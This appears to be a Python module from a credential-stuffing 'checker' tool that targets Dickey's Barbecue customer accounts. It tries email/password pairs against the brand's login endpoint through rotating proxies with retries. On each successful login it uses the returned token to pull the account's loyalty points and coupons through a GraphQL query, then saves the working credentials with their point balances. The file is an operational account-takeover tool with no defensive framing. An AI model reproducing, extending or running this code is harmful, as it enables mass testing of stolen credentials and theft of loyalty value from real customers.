from modules.variables import Checker
from modules.functions import bad_proxy, log, save, set_proxy, return_proxy
from requests import Session
import functools
from requests.adapters import HTTPAdapter, Retry

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                data = {"email":email,"password":password,"inApp":True}
                r = s.post('https://login.dickeys.com/loginOLO',json=data)
                if "Bad" in r.text or "Unauthorized" in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "token" not in r.text:
                    raise
                
                token = r.json()['jwt_token']
                data = """{\"operationName\":null,\"variables\":{\"itemimageFilter\":{\"label\":{\"eq\":\"375x167\"}},\"unusedCouponsFilter\":[{\"usedOn\":{\"null\":true},\"validUntil\":{\"gte\":\"2022-04-06 21:47:52\"}}],\"includePersonConnection\":true},\"query\":\"query ($unusedCouponsFilter: [PersonCouponFilter], $includePersonConnection: Boolean!) {  viewer {    id    accessLevel    ...personCouponsFragment    __typename  }}fragment personCouponsFragment on Viewer {  personConnection(first: 1) @include(if: $includePersonConnection) {    edges {      node {        id        login {          id          lifetimePoints          spendablePoints          newLoyaltyLifetimePoints          __typename        }        usedCoupons: personCouponConnection(sort: {usedOn: DESC}, filter: [{usedOn: {null: false}}]) {          totalCount          edges {            node {              id              validUntil              usedOn              lineId              coupon {                id                code                description                imageURL                coupontypeId                label                __typename              }              __typename            }            __typename          }          __typename        }        availableCoupons: personCouponConnection(sort: {created: DESC}, filter: $unusedCouponsFilter) {          totalCount          edges {            node {              id              validUntil              usedOn              lineId              coupon {                id                description                imageURL                coupontypeId                code                label                couponActionConnection {                  edges {                    node {                      id                      target                      __typename                    }                    __typename                  }                  __typename                }                __typename              }              __typename            }            __typename          }          __typename        }        __typename      }      __typename    }    __typename  }  __typename}\"}"""
                headers = {
                    "authorization": f"Bearer {token}" ,
                    "brandid": "1",
                    "Content-Type":"application/json"
                }
                r = s.post('https://orders-api.dickeys.com/',data=data,headers=headers,allow_redirects=False)
                points = r.text.split('"spendablePoints": ')[1].split(',')[0]
                
                if not Checker.cui: log("good",':'.join([email,password]),"Dickeys")
                save("Dickeys","good",Checker.time,':'.join([email,password])+f" | Points: {points}")
                Checker.good += 1
                return_proxy(proxy)
                return

        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        